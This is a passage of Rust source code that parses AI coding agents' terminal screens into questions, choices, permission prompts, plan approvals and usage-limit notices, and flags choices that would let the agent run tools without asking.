//! What a waiting agent asks, read off the bottom of its screen: the question, its numbered choices, whether they are
//! checkboxes, where the cursor is and where Submit sits; and the keys that answer it. Ported from herdr-relevo's
//! `lib/prompt.js` (Apache-2.0), whose key sequences were measured on Claude Code's menus.
//! Source: https://github.com/johnny4young/herdr-relevo (Apache-2.0), modified for cockpit; see THIRD_PARTY_NOTICES.md.

use std::sync::LazyLock;

use regex::Regex;
use serde_json::{Value, json};

static OPTION: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^([❯›>]\s*)?(\d)\.\s+(.+?)\s*$").unwrap());
static SUBMIT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)^([❯›>]\s*)?(Submit|Submit answers)$").unwrap());
static BOX: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\[([ xX✔✓✗])?\]\s*").unwrap());
static FRAME: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[│┃╭╮╰╯─━┌┐└┘|\s]+|[│┃╭╮╰╯─━┌┐└┘|\s]+$").unwrap());
static BESIDE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\s{3,}[┌│└╭╰].*$").unwrap());
/// Lines between two choices that still belong to the menu: a description, a blank, a separator, Submit.
const MAX_GAP: usize = 4;

#[derive(Clone, Debug, PartialEq)]
pub enum Cursor {
    On(u32),
    Submit,
}

#[derive(Clone, Debug, PartialEq)]
pub struct Choice {
    pub n: u32,
    pub label: String,
    pub detail: String,
    /// A checkbox's state in a multiple choice, None in a single one.
    pub checked: Option<bool>,
}

#[derive(Clone, Debug, PartialEq, Default)]
pub struct Question {
    pub text: String,
    pub choices: Vec<Choice>,
    pub cursor: Option<Cursor>,
    /// Submit follows this choice (multiple choice forms).
    pub submit_after: Option<u32>,
    pub preview: String,
    /// The choice whose field takes free text, if any.
    pub free: Option<u32>,
    /// The prompt's own lines above choice 1, from its frame or header down (a text question: the last lines): what
    /// it is about, for telling one prompt from the next.
    pub block: Vec<String>,
    /// It asks before something runs, changes or is trusted, by its agent's prompt shapes (`agent::Agent::permission`).
    pub permission: bool,
    /// Its choices are numbered on screen; an unnumbered menu (Claude's folder trust) is moved through with arrows.
    pub numbered: bool,
    /// A permission cockpit cannot show in full (no frame on the screen tells where it starts, or nothing of it was
    /// read): it is answered in the agent's terminal.
    pub cut: bool,
    /// Its preview is Markdown (a plan, read whole from the transcript): the card renders it rather than showing it as typed.
    pub markdown: bool,
    /// The view the plan is kept as in its session's side panel (`plan-<session>-<n>`), once it is kept.
    pub view: Option<String>,
    /// Its last output says it reached a usage or rate limit, by its agent's screen shapes.
    pub limit: Option<Limit>,
    /// The person's own words are the last thing above its input box: what it asked was answered there.
    pub replied: bool,
}

/// A usage or rate limit an agent says it reached.
#[derive(Clone, Debug, PartialEq, Default)]
pub struct Limit {
    /// When its screen says the limit ends, as "08:00" or "12 Oct 08:00"; None when it does not say.
    pub reset: Option<String>,
    /// The time zone the screen gives that time in ("America/New_York"), when it names one.
    pub zone: Option<String>,
}

impl Question {
    /// Whether the screen asks anything: a menu, or the agent's own words above its box.
    pub fn asks(&self) -> bool {
        !self.choices.is_empty() || !self.text.trim().is_empty()
    }

    pub fn multi(&self) -> bool {
        self.choices.iter().any(|c| c.checked.is_some())
    }

    pub fn kind(&self) -> &'static str {
        match () {
            _ if self.choices.is_empty() => "text",
            _ if self.multi() => "multi",
            _ => "single",
        }
    }

    /// What tells this prompt from the next one on the same screen, as hex: its own block of lines, each choice's
    /// number, label and detail, and `count`, which the poller moves on for each new prompt it sees. The cursor, the
    /// ticks, the box beside the choices and the free field's label move while it is answered, so they are left out.
    pub fn fingerprint(&self, count: u64) -> String {
        format!("{:016x}", fnv(format!("{}\u{1e}{count}", self.shape()).as_bytes()))
    }

    /// What it waits on, the same across hub restarts: its prompt's shape, else that it reached a limit, else that it
    /// asks nothing cockpit can read. A dismissal holds while this stays.
    pub fn identity(&self) -> String {
        match (self.asks(), &self.limit) {
            (true, _) => format!("{:016x}", fnv(self.shape().as_bytes())),
            (false, Some(_)) => "limit".into(),
            (false, None) => "terminal".into(),
        }
    }

    /// The prompt without its count: what the poller compares to tell a new prompt from the one it saw.
    pub fn shape(&self) -> String {
        let mut parts: Vec<String> = vec![self.kind().to_string()];
        parts.extend(self.block.iter().cloned());
        // Once words are typed in a multiple choice's free field they are its label, and it reads as an ordinary last choice.
        let free = self.free.or_else(|| self.multi().then(|| self.choices.last().map(|c| c.n)).flatten());
        for c in &self.choices {
            let free = Some(c.n) == free;
            parts.push(format!("{}\u{1f}{}\u{1f}{}", c.n, if free { "" } else { &c.label }, if free { "" } else { &c.detail }));
        }
        parts.join("\u{1e}")
    }

    /// The numbers of the choices that turn on a mode running every tool unasked: by their label or detail, or a yes to
    /// a prompt about one. Every surface asks for a step of its own before it picks one.
    pub fn unasked(&self) -> Vec<u32> {
        let about = self.block.iter().chain(std::iter::once(&self.text)).any(|l| UNASKED.is_match(l));
        self.choices
            .iter()
            .filter(|c| UNASKED.is_match(&c.label) || UNASKED.is_match(&c.detail) || (about && c.label.trim_start().to_lowercase().starts_with("yes")))
            .map(|c| c.n)
            .collect()
    }

    pub fn json(&self) -> Value {
        // A permission is answered on purpose: no choice is drawn as the one under the cursor.
        let cursor = match &self.cursor {
            _ if self.permission => Value::Null,
            Some(Cursor::On(n)) => json!(n),
            Some(Cursor::Submit) => json!("submit"),
            None => Value::Null,
        };
        let choices: Vec<Value> = self
            .choices
            .iter()
            .map(|c| json!({"n": c.n, "label": c.label, "detail": c.detail, "checked": c.checked, "free": Some(c.n) == self.free}))
            .collect();
        let cut = self.permission && self.cut;
        json!({"text": self.text, "kind": self.kind(), "choices": choices, "cursor": cursor, "submit": self.submit_after.is_some(), "preview": self.preview,
               "permission": self.permission, "cut": cut, "terminal_only": if cut { json!(CUT) } else { Value::Null }, "unasked": self.unasked(),
               "markdown": self.markdown, "view": self.view})
    }

    /// Shows the whole plan a plan approval asks about, from the transcript, where the screen scrolls only part of it:
    /// the preview becomes the plan as Markdown, nothing of it is cut, and the menu is a permission whatever its
    /// agent's shapes say. Any other prompt is left as read.
    pub fn with_plan(&mut self, plan: &str) {
        let plan = plan.trim();
        if plan.is_empty() || self.choices.is_empty() || !self.about_plan() {
            return;
        }
        self.preview = plan.to_string();
        self.cut = false;
        self.markdown = true;
        self.permission = true;
    }

    /// Whether the menu approves a plan: its question or a choice names the plan or its implementation (Claude Code,
    /// Codex, Gemini), or its choices are the ones Qwen Code's docs give (proceed once or always, restore, cancel).
    fn about_plan(&self) -> bool {
        let names = |l: &str| PLAN_WORDS.is_match(l);
        let said = self.block.iter().chain(std::iter::once(&self.text)).any(|l| names(l)) || self.choices.iter().any(|c| names(&c.label));
        let qwen =
            self.choices.iter().all(|c| QWEN_PLAN_CHOICE.is_match(&c.label)) && self.choices.iter().any(|c| c.label.to_lowercase().starts_with("proceed"));
        said || qwen
    }
}

/// How a plan approval names its plan, and how Qwen Code's docs label its choices.
static PLAN_WORDS: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)\b(plan|implement)\b").unwrap());
static QWEN_PLAN_CHOICE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)^(proceed (once|always)|restore previous|cancel)\b").unwrap());

/// FNV-1a, 64 bits: the same text gives the same number in every build, which a hasher with random keys would not.
fn fnv(bytes: &[u8]) -> u64 {
    bytes.iter().fold(0xcbf2_9ce4_8422_2325, |h, b| (h ^ u64::from(*b)).wrapping_mul(0x0000_0100_0000_01b3))
}

/// How many of a text question's last lines tell it apart.
const TEXT_LINES: usize = 6;
/// How far above its menu a question without a frame is read: a spinner or a timer further up does not move it.
const QUESTION_LINES: usize = 8;

/// A frame across the screen at column 0, the way Claude Code opens its prompts: nothing a command prints can draw
/// one, since a prompt indents what it quotes.
pub(crate) fn frame_rule(line: &str, width: usize) -> bool {
    let line = line.trim_end();
    let n = cockpit_core::text::width(line);
    n >= 20 && n * 10 >= width * 9 && line.chars().all(|c| matches!(c, '─' | '━' | '═' | '▔' | '▁' | '╭' | '╮' | '┌' | '┐'))
}

/// What turns on a mode running tools unasked: Claude Code's plan approval and bypass-mode warning, Codex's full access
/// and its approval without asking.
static UNASKED: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)bypass permissions|\bauto mode\b|without (asking for )?approval|\bfull access\b|danger-full-access|^\s*yes, i accept\b").unwrap()
});

/// Choice labels that only a request for permission has: an unknown agent's or an unmeasured prompt still reads as one.
static PERMISSION_LABEL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^(yes\b|no, and tell\b|allow\b|deny\b)|don.?t ask again|do not ask again").unwrap());
/// The hint under a menu Claude Code and Codex draw.
pub(crate) static HINT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)enter to (confirm|select|submit)|esc to cancel").unwrap());

pub(crate) fn unframe(line: &str) -> String {
    FRAME.replace_all(line, "").into_owned()
}

/// How an agent's screen reads around its words, compiled from the agent table (`cockpit_core::agent`): its permission
/// prompts, its own furniture, and the lines that say a limit was reached or is over.
#[derive(Default)]
pub struct Shapes {
    permission: Vec<Regex>,
    footer: Vec<Regex>,
    busy: Vec<Regex>,
    limit: Vec<Regex>,
    lifted: Vec<Regex>,
    pub(crate) completion: Vec<Regex>,
    pub(crate) dialog_hint: Vec<Regex>,
    pub(crate) dialog_title: Vec<Regex>,
}

impl Shapes {
    /// The shapes of agent `id` (an alias too); for a program the table does not know, every agent's. Compiled once per
    /// agent until the config changes.
    pub fn of(id: &str) -> std::sync::Arc<Shapes> {
        type Held = std::collections::HashMap<String, (Vec<Option<std::time::SystemTime>>, std::sync::Arc<Shapes>)>;
        static HELD: std::sync::Mutex<Option<Held>> = std::sync::Mutex::new(None);
        let files = [cockpit_core::files::cache().join("config.json"), cockpit_core::files::config_dir().join("config.json")];
        let stamp: Vec<Option<std::time::SystemTime>> = files.iter().map(|f| std::fs::metadata(f).and_then(|m| m.modified()).ok()).collect();
        let mut held = HELD.lock().unwrap_or_else(|e| e.into_inner());
        let held = held.get_or_insert_with(Default::default);
        if let Some((at, shapes)) = held.get(id)
            && *at == stamp
        {
            return std::sync::Arc::clone(shapes);
        }
        let all = cockpit_core::agent::all();
        let own = all.iter().find(|a| a.id == id || a.aliases.iter().any(|x| x == id)).map(|a| a.permission.clone()).filter(|p| !p.is_empty());
        let shapes =
            std::sync::Arc::new(Shapes::with(&own.unwrap_or_else(|| all.into_iter().flat_map(|a| a.permission).collect()), &cockpit_core::agent::screen(id)));
        held.insert(id.to_string(), (stamp, std::sync::Arc::clone(&shapes)));
        shapes
    }

    /// These permission patterns, with every agent's furniture.
    pub fn asking(permission: &[String]) -> Shapes {
        Shapes::with(permission, &cockpit_core::agent::screen(""))
    }

    fn with(permission: &[String], screen: &cockpit_core::agent::Screen) -> Shapes {
        Shapes {
            permission: patterns(permission),
            footer: patterns(&screen.footer),
            busy: patterns(&screen.busy),
            limit: patterns(&screen.limit),
            lifted: patterns(&screen.lifted),
            completion: patterns(&screen.completion),
            dialog_hint: patterns(&screen.dialog_hint),
            dialog_title: patterns(&screen.dialog_title),
        }
    }

    pub(crate) fn any(list: &[Regex], line: &str) -> bool {
        list.iter().any(|r| r.is_match(line))
    }
}

/// The question on the screen, with no agent's prompt shapes: never a permission.
pub fn read(screen: &str) -> Question {
    read_as(screen, &[])
}

/// The question on the screen, `shapes` being the agent's permission prompt patterns.
pub fn read_as(screen: &str, shapes: &[String]) -> Question {
    read_for(screen, &Shapes::asking(shapes))
}

/// The question on the screen: its choices when it shows a menu (numbered, or a cursor moving through lines with
/// Enter to confirm under them), else the agent's last words above its input box. Its box, status line, mode line,
/// key hints and spinners are never a question or a choice.
pub fn read_for(screen: &str, shapes: &Shapes) -> Question {
    let raw: Vec<&str> = screen.lines().collect();
    let lines: Vec<String> = raw.iter().map(|l| unframe(l)).collect();
    let boxed = input_box(&raw, &lines, shapes);
    // A list above the agent's input box is what it said, not a menu waiting on a key.
    let menu = numbered_menu(&lines, screen).or_else(|| cursor_menu(&lines, &raw)).filter(|(_, _, last)| boxed.is_none_or(|b| b.at <= *last));
    let Some((mut q, first, _)) = menu else {
        return said_above(&raw, &lines, boxed, shapes);
    };
    let asks = &shapes.permission;
    q.text = question_above(&lines, first);
    q.free = free_option(&q);
    // In display columns: combining marks and wide characters count as the screen draws them.
    let width = raw.iter().map(|l| cockpit_core::text::width(l.trim_end())).max().unwrap_or(0);
    let top = (0..first).rev().find(|&i| frame_rule(raw[i], width)).map(|i| i + 1);
    let own: Vec<&str> = lines[top.unwrap_or(0)..first].iter().map(|l| l.trim()).filter(|l| !l.is_empty()).collect();
    let shaped = |l: &str| asks.iter().any(|r| r.is_match(l));
    let asks_words = q.free.is_some() || q.choices.iter().any(|c| c.label.to_lowercase().starts_with("chat about this"));
    let labelled = q.choices.iter().any(|c| PERMISSION_LABEL.is_match(&c.label));
    // Fails closed: a menu reading like a request for permission is one, unless it takes words like a question does.
    q.permission = !asks_words && !q.multi() && (own.iter().any(|l| shaped(l)) || shaped(q.text.trim()) || labelled);
    if !q.permission {
        q.block = block_above(&lines, top.unwrap_or(first.saturating_sub(QUESTION_LINES)), first);
        return q;
    }
    // From the frame down. With no frame on the screen nothing tells where the prompt starts: a command can print a
    // line that reads like its question, so everything read is kept and the prompt is cut.
    q.cut = top.is_none();
    q.block = own.iter().map(|l| l.to_string()).collect();
    if q.preview.is_empty() {
        // What it asks to do: its block, less the one question line right above the menu.
        let mut preview = q.block.clone();
        if preview.last().is_some_and(|l| shaped(l)) {
            preview.pop();
        }
        q.preview = preview.join("\n");
    }
    // Nothing of what it would run read: no card can show it either.
    q.cut |= q.preview.trim().is_empty();
    q
}

/// What a permission cockpit cannot show in full is told, on every surface: it is answered in the agent's terminal.
pub const CUT: &str = "Part of what it would run is off its screen: answer it in its terminal";
/// A numbered menu, walking up from its last choice to choice 1: the question and the line choice 1 is on.
fn numbered_menu(lines: &[String], screen: &str) -> Option<(Question, usize, usize)> {
    let last = (0..lines.len()).rev().find(|&i| OPTION.is_match(&lines[i]))?;
    let number = |i: usize| OPTION.captures(&lines[i]).and_then(|c| c[2].parse::<u32>().ok()).unwrap_or(0);
    let mut found = vec![(last, number(last))];
    let mut gap = 0;
    let mut i = last;
    while i > 0 && found[0].1 > 1 && gap <= MAX_GAP {
        i -= 1;
        if !OPTION.is_match(&lines[i]) {
            gap += 1;
            continue;
        }
        if number(i) != found[0].1 - 1 {
            break;
        }
        found.insert(0, (i, number(i)));
        gap = 0;
    }
    if found[0].1 != 1 {
        return None;
    }
    let mut q = Question { numbered: true, ..Default::default() };
    for (k, &(i, n)) in found.iter().enumerate() {
        let caps = OPTION.captures(&lines[i]).expect("matched above");
        let raw = BESIDE.replace(&caps[3], "").into_owned();
        if caps.get(1).is_some() {
            q.cursor = Some(Cursor::On(n));
        }
        let next = found.get(k + 1).map(|f| f.0).unwrap_or_else(|| lines.len().min(i + 1 + MAX_GAP));
        let mut detail = Vec::new();
        for l in lines[i + 1..next].iter().map(|l| l.trim()).filter(|l| !l.is_empty()) {
            if let Some(s) = SUBMIT.captures(l) {
                q.submit_after = Some(n);
                if s.get(1).is_some() {
                    q.cursor = Some(Cursor::Submit);
                }
            } else if !OPTION.is_match(l) && !HINT.is_match(l) {
                detail.push(l.to_string());
            }
        }
        let (label, checked) = match BOX.captures(&raw) {
            Some(b) => (raw[b[0].len()..].to_string(), Some(b.get(1).is_some_and(|m| m.as_str() != " "))),
            None => (raw.clone(), None),
        };
        let detail = if k + 1 < found.len() { detail.join(" ") } else { String::new() };
        q.choices.push(Choice { n, label, detail, checked });
    }
    q.preview = preview_beside(screen);
    Some((q, found[0].0, last))
}

/// A menu without numbers (Claude's folder trust): lines at one indent, one of them behind the cursor, with Enter to
/// confirm under them. Its choices are numbered here in order, and answered with arrows.
fn cursor_menu(lines: &[String], raw: &[&str]) -> Option<(Question, usize, usize)> {
    let hint = (0..lines.len()).rev().take(12).find(|&i| HINT.is_match(&lines[i]))?;
    let at = (hint.saturating_sub(10)..hint).rev().find(|&i| lines[i].starts_with(['❯', '›']))?;
    let indent = |line: &str| line.chars().take_while(|c| c.is_whitespace()).count();
    let after_cursor =
        |line: &str| line.chars().position(|c| c == '❯' || c == '›').map(|p| p + 1 + line.chars().skip(p + 1).take_while(|c| c.is_whitespace()).count());
    let col = after_cursor(raw[at])?;
    let option = |i: usize| i == at || (!lines[i].trim().is_empty() && indent(raw[i]) == col && !HINT.is_match(&lines[i]));
    let mut first = at;
    while first > 0 && option(first - 1) {
        first -= 1;
    }
    let mut last = at;
    while last + 1 < hint && option(last + 1) {
        last += 1;
    }
    if last == first {
        return None;
    }
    let mut q = Question::default();
    for (k, i) in (first..=last).enumerate() {
        let n = k as u32 + 1;
        if i == at {
            q.cursor = Some(Cursor::On(n));
        }
        let label = lines[i].trim().trim_start_matches(['❯', '›']).trim().to_string();
        q.choices.push(Choice { n, label, detail: String::new(), checked: None });
    }
    Some((q, first, last))
}

/// A question's own lines above choice 1, blanks left out: up to the frame it opens under (`top`), or a form's tab
/// strip.
fn block_above(lines: &[String], top: usize, first: usize) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for l in lines[top..first].iter().rev().map(|l| l.trim()) {
        if l.starts_with('←') && l.ends_with('→') {
            break;
        }
        if !l.is_empty() {
            out.insert(0, l.to_string());
        }
    }
    out
}

fn patterns(shapes: &[String]) -> Vec<Regex> {
    shapes.iter().filter_map(|s| Regex::new(s).ok()).collect()
}

/// Whether the bottom of the screen shows a menu, read or not: a numbered choice behind the cursor, or a menu's hint.
/// Words typed into it would land in the menu, and Enter would pick what is under its cursor.
pub fn menu_shown(screen: &str) -> bool {
    static CURSOR_ON_CHOICE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\s*[❯›]\s*\d+\.\s").unwrap());
    let raw: Vec<&str> = screen.lines().collect();
    let lines: Vec<String> = raw.iter().map(|l| unframe(l)).collect();
    if lines.iter().rev().take(20).any(|l| HINT.is_match(l)) {
        return true;
    }
    // What stands above the agent's input line is its transcript, not a menu waiting on Enter.
    let below = input_line(&lines).map_or(0, |i| i + 1);
    if numbered_menu(&lines, screen).or_else(|| cursor_menu(&lines, &raw)).is_some_and(|(_, first, _)| first >= below) {
        return true;
    }
    lines[below..].iter().rev().take(20).any(|l| CURSOR_ON_CHOICE.is_match(l))
}

/// What is typed in the agent's input box, read from the bottom of the screen up to DRAFT_LINES: None when no box shows.
/// Claude Code's suggestion in an empty box (`Try "…"`, the whole line) is not typed.
pub fn draft(screen: &str) -> Option<String> {
    static SUGGESTION: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"^Try "[^"]*"$"#).unwrap());
    let lines: Vec<String> = screen.lines().map(unframe).collect();
    let at = (0..lines.len()).rev().take(DRAFT_LINES).find(|&i| {
        let l = lines[i].trim();
        l == ">" || l == "›" || l == "❯" || (l.starts_with(['>', '›', '❯']) && l.chars().nth(1).is_some_and(char::is_whitespace))
    })?;
    let typed = lines[at].trim().trim_start_matches(['>', '›', '❯']).trim().to_string();
    Some(if SUGGESTION.is_match(&typed) { String::new() } else { typed })
}

/// What is typed in the agent's input line, never a menu's row behind the cursor: None when no input line shows.
pub(crate) fn typed(screen: &str) -> Option<String> {
    let lines: Vec<String> = screen.lines().map(unframe).collect();
    let at = input_line(&lines)?;
    draft(&lines[at..].join("\n"))
}

/// How far up from the bottom the input box is looked for: under it, an agent draws its status lines and hints.
const DRAFT_LINES: usize = 30;

/// The agent's input line, from the bottom: what is typed there and the status line under it change on their own.
pub(crate) fn input_line(lines: &[String]) -> Option<usize> {
    (0..lines.len()).rev().take(8).find(|&i| {
        let l = lines[i].trim();
        // A numbered choice behind the cursor is a menu's line, not the input.
        l == ">" || l == "›" || l == "❯" || (l.starts_with(['>', '›', '❯']) && l.chars().nth(1).is_some_and(char::is_whitespace) && !OPTION.is_match(l))
    })
}

/// How far up from the bottom an agent's input box is looked for: under it sit its status lines, mode line and hints.
const FOOTER_LINES: usize = 30;
/// How many lines of its last output are read for news of a limit.
const LIMIT_LINES: usize = 12;

/// A line an agent's prompt mark opens: its input line, or what the person sent as the transcript shows it.
fn prompt_line(line: &str) -> bool {
    let l = line.trim();
    l == ">" || l == "›" || l == "❯" || (l.starts_with(['>', '›', '❯']) && l.chars().nth(1).is_some_and(char::is_whitespace) && !OPTION.is_match(l))
}

/// A rule across the screen, a label on it or not: the edge of an input box.
fn rule(raw: &str) -> bool {
    raw.trim_start().chars().take_while(|c| matches!(c, '─' | '━' | '═' | '╭' | '╮' | '╰' | '╯' | '┌' | '┐' | '└' | '┘')).count() >= 12
}

/// One key hint as any agent writes it: a key, then what it does ("esc to interrupt", "? for shortcuts").
static KEY_HINT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)^\(?(press\s+)?(esc|enter|return|tab|shift\+tab|ctrl\+\S+|alt\+\S+|⏎|↵|↑/↓|↑↓)\s+(to|for)\s+[^?…()]*\)?$|^\S\s+for\s+(shortcuts|commands|help)$",
    )
    .unwrap()
});

/// A line of key hints and nothing else, its hints between "·", "•" or "|" ("Enter to select · Esc to cancel").
fn hints(line: &str) -> bool {
    let line = line.trim();
    !line.is_empty()
        && line.split(['·', '•', '|']).map(str::trim).filter(|h| !h.is_empty()).all(|h| KEY_HINT.is_match(h) || meter(h))
        && line.split(['·', '•', '|']).any(|h| KEY_HINT.is_match(h.trim()))
}

/// Whether a line asks something: a question mark outside a link.
fn asks_in(line: &str) -> bool {
    line.split_whitespace().filter(|w| !w.contains("://")).any(|w| w.contains(['?', '？', '؟']))
}

/// A status line's meters ("7d 100%", "C 64%·5h", "41% context left"): a percentage among a few short words.
fn meter(line: &str) -> bool {
    let tokens: Vec<&str> = line.split(|c: char| c.is_whitespace() || matches!(c, '·' | '•' | '|' | '│')).filter(|t| !t.is_empty()).collect();
    let percent = |t: &str| t.ends_with('%') && t.trim_start_matches(['≥', '~', '<', '>']).trim_end_matches('%').parse::<f64>().is_ok();
    !line.contains('?') && tokens.iter().any(|t| percent(t)) && (tokens.len() <= 3 || tokens.iter().all(|t| t.chars().count() <= 4))
}

/// The agent's input box, from the bottom: the line its prompt mark is on (`at`) and the line the box starts at.
#[derive(Clone, Copy)]
struct InputBox {
    at: usize,
    start: usize,
}

/// A prompt line under a rule or in a frame is the box; one without a frame is, when only furniture stands under it.
fn input_box(raw: &[&str], lines: &[String], shapes: &Shapes) -> Option<InputBox> {
    let at = (lines.len().saturating_sub(FOOTER_LINES)..lines.len()).rev().find(|&i| prompt_line(&lines[i]))?;
    let under_rule = at > 0 && rule(raw[at - 1]);
    if under_rule || raw[at].trim_start().starts_with(['│', '┃', '|']) {
        return Some(InputBox { at, start: if under_rule { at - 1 } else { at } });
    }
    let furniture = |i: usize| lines[i].trim().is_empty() || rule(raw[i]) || footer_line(lines[i].trim(), shapes);
    (at + 1..lines.len()).all(furniture).then_some(InputBox { at, start: at })
}

/// A line of an agent's footer: its mode line, a key hint, a status line's meters.
fn footer_line(line: &str, shapes: &Shapes) -> bool {
    Shapes::any(&shapes.footer, line) || Shapes::any(&shapes.busy, line) || hints(line) || meter(line)
}

/// Where the footer of a screen without an input box starts: the blank lines, hints and meters at its bottom, and the
/// status line right above an agent's mode line.
fn footer_start(raw: &[&str], lines: &[String], shapes: &Shapes) -> usize {
    let mut start = lines.len();
    while start > 0 && (lines[start - 1].trim().is_empty() || rule(raw[start - 1]) || footer_line(lines[start - 1].trim(), shapes)) {
        start -= 1;
    }
    // A status line says anything: it is the agent's when its mode line closes the same block.
    let block_end = (start..lines.len()).find(|&i| lines[i].trim().is_empty()).unwrap_or(lines.len());
    let anchored = start < lines.len() && (start..block_end).any(|i| Shapes::any(&shapes.footer, lines[i].trim()));
    let mut above = 0;
    while anchored && start > 0 && above < 2 && !lines[start - 1].trim().is_empty() {
        start -= 1;
        above += 1;
    }
    start
}

/// How many lines of the agent's last message a text question shows.
const SAID_LINES: usize = 4;

/// What a screen without a menu asks: the agent's last message above its footer (from its last "⏺"/"•" line, its last
/// lines) when it asks something or an empty input box waits for words. Nothing when the person's own words are the
/// last thing there, when it ends on a tool's output, or when its last output says it reached a limit.
fn said_above(raw: &[&str], lines: &[String], boxed: Option<InputBox>, shapes: &Shapes) -> Question {
    let end = boxed.map_or_else(|| footer_start(raw, lines, shapes), |b| b.start);
    let empty_box = boxed.is_some_and(|b| {
        let typed = lines[b.at].trim().trim_start_matches(['>', '›', '❯']).trim();
        typed.is_empty() || (typed.starts_with("Try \"") && typed.ends_with('"'))
    });
    // What is left once the rules, spinners and hints are out: (line, text).
    let noise = |i: usize| rule(raw[i]) || Shapes::any(&shapes.busy, lines[i].trim());
    let body: Vec<(usize, &str)> = (0..end).map(|i| (i, lines[i].trim())).filter(|(i, l)| !l.is_empty() && !noise(*i)).collect();
    let strip = |l: &str| l.starts_with('←') && l.ends_with('→');
    let kept: Vec<(usize, &str)> = body.iter().copied().filter(|(_, l)| !hints(l) && !strip(l)).collect();
    let block: Vec<String> = kept[kept.len().saturating_sub(TEXT_LINES)..].iter().map(|(_, l)| l.to_string()).collect();
    let limit = limit_in(&body, shapes);
    // The last paragraph: the kept lines with no blank line between them.
    let mut paragraph: Vec<&str> = Vec::new();
    if let Some(&(last, _)) = kept.last() {
        let top = (0..=last).rev().find(|&i| lines[i].trim().is_empty()).map_or(0, |i| i + 1);
        paragraph = kept.iter().filter(|(i, _)| *i >= top).map(|(_, l)| *l).collect();
    }
    let replied = paragraph.first().is_some_and(|l| prompt_line(l));
    let prose = !replied && limit.is_none() && !paragraph.iter().any(|l| l.starts_with('⎿')) && paragraph.first().is_some_and(|l| !tool_call(l));
    // The agent's last message: from its last line of words, down to the footer, tool output left out.
    let from = kept.iter().rposition(|(_, l)| SAID.is_match(l) && !tool_call(l)).unwrap_or(0);
    let message: Vec<&str> = kept[from..].iter().map(|(_, l)| *l).filter(|l| !l.starts_with('⎿') && !tool_call(l)).collect();
    let asks = prose && (message.iter().any(|l| asks_in(l)) || (empty_box && !message.is_empty()));
    let text = if asks { message[message.len().saturating_sub(SAID_LINES)..].join("\n") } else { String::new() };
    Question { text, block, limit, replied, ..Default::default() }
}

/// The limit an agent's last output says it reached: read up from the bottom, past what the person typed since, until
/// the agent says something else or that the limit is over.
fn limit_in(body: &[(usize, &str)], shapes: &Shapes) -> Option<Limit> {
    let mut found: Option<Limit> = None;
    for (_, line) in body.iter().rev().take(LIMIT_LINES) {
        if Shapes::any(&shapes.lifted, line) {
            break;
        }
        // A question about a limit is no limit reached; a tool's output reports one only in its agent's own words.
        let own = Shapes::any(&shapes.limit, line);
        let worded = shapes.limit.is_empty() && !line.starts_with('⎿') && ANY_LIMIT.is_match(line);
        if !asks_in(line) && (own || worded) {
            let limit = found.get_or_insert_with(Limit::default);
            if limit.reset.is_none()
                && let Some((at, zone)) = reset_in(line)
            {
                (limit.reset, limit.zone) = (Some(at), zone);
            }
        } else if SAID.is_match(line) {
            break;
        }
    }
    found
}

/// A limit reached, as an agent with no limit shapes of its own may word it.
static ANY_LIMIT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(usage|rate|spend|spending|quota) limit (was |is |has been )?(reached|exceeded|hit)\b|\b(hit|reached|exceeded) (your|the) ([a-z0-9-]+ ){0,3}(limit|quota)\b").unwrap()
});

/// When a line says its limit ends ("resets 8am", "continuing automatically at 8am", "try again at 3:14 PM"): "08:00", or
/// "12 Oct 08:00" with a day, and the time zone it names. Only what the line says.
fn reset_in(line: &str) -> Option<(String, Option<String>)> {
    static RESET: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(
            r"(?i)\b(?:resets?(?:\s+at)?|continuing automatically at|try again at|again at)\s+(?:([a-z]{3})[a-z]*\.?\s+(\d{1,2})(?:,|\s+at)?\s+)?(\d{1,2})(?::(\d{2}))?\s?(?:([ap])\.?m\b\.?)?(?:\s*\(([A-Za-z_]+/[A-Za-z_/+-]+)\))?",
        )
        .unwrap()
    });
    let caps = RESET.captures(line)?;
    let (hour, minute, half) = (caps[3].parse::<u32>().ok()?, caps.get(4).map(|m| m.as_str()), caps.get(5).map(|m| m.as_str().to_lowercase()));
    // A bare number is no time of day.
    if minute.is_none() && half.is_none() {
        return None;
    }
    let hour = match half.as_deref() {
        Some("p") if hour < 12 => hour + 12,
        Some("a") if hour == 12 => 0,
        _ => hour,
    };
    let minute: u32 = minute.map_or(Some(0), |m| m.parse().ok())?;
    if hour > 23 || minute > 59 {
        return None;
    }
    let mut at = format!("{hour:02}:{minute:02}");
    if let (Some(month), Some(day)) = (caps.get(1), caps.get(2)) {
        let month = month.as_str();
        at = format!("{} {}{} {at}", day.as_str().trim_start_matches('0'), month[..1].to_uppercase(), month[1..].to_lowercase());
    }
    Some((at, caps.get(6).map(|z| z.as_str().to_string())))
}

/// This machine's time zone by name ("Europe/Paris"): TZ, else where /etc/localtime points.
pub fn local_zone() -> Option<String> {
    let named = std::env::var("TZ").ok().filter(|z| z.contains('/')).map(|z| z.trim_start_matches(':').to_string());
    named.or_else(|| {
        let target = std::fs::read_link("/etc/localtime").ok()?;
        let text = target.to_string_lossy().into_owned();
        text.split_once("zoneinfo/").map(|(_, zone)| zone.to_string())
    })
}

/// The paragraph right above the choices, two lines at most: it ends at a blank, the input prompt or a tab strip.
fn question_above(lines: &[String], first: usize) -> String {
    let mut out: Vec<String> = Vec::new();
    let mut i = first;
    while i > 0 && lines[i - 1].trim().is_empty() {
        i -= 1;
    }
    while i > 0 && out.len() < 2 {
        i -= 1;
        let l = lines[i].trim();
        let prompt = l.starts_with(['❯', '›', '>']) && l.chars().nth(1).is_some_and(char::is_whitespace);
